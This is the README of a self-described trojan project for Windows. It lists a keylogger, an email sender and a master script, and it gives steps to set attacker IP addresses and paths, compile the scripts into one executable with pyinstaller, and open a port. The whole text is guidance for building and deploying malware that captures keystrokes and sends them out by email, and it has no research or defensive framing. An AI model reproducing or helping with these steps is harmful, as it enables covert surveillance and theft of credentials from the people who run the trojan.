this is a trojan project that i am constantly developing if a new version comes out it has been tested by me and should therefore be stable

INSTALLATION:
The installation must be done on windows!
The paths and addresses(IP) have to be adjusted in the "keylogger.py","email_sender.py" and "master.py"!
1. pip install pyinstaller
2. python --onefile [master.py]
now the exploit is ready to be executed
if errors occur during execution a pip install --upgrade 'setuptools<45.0.0'   help
be sure that you have installed all the modules you need via "pip"

Dont forget to open the Port ;)
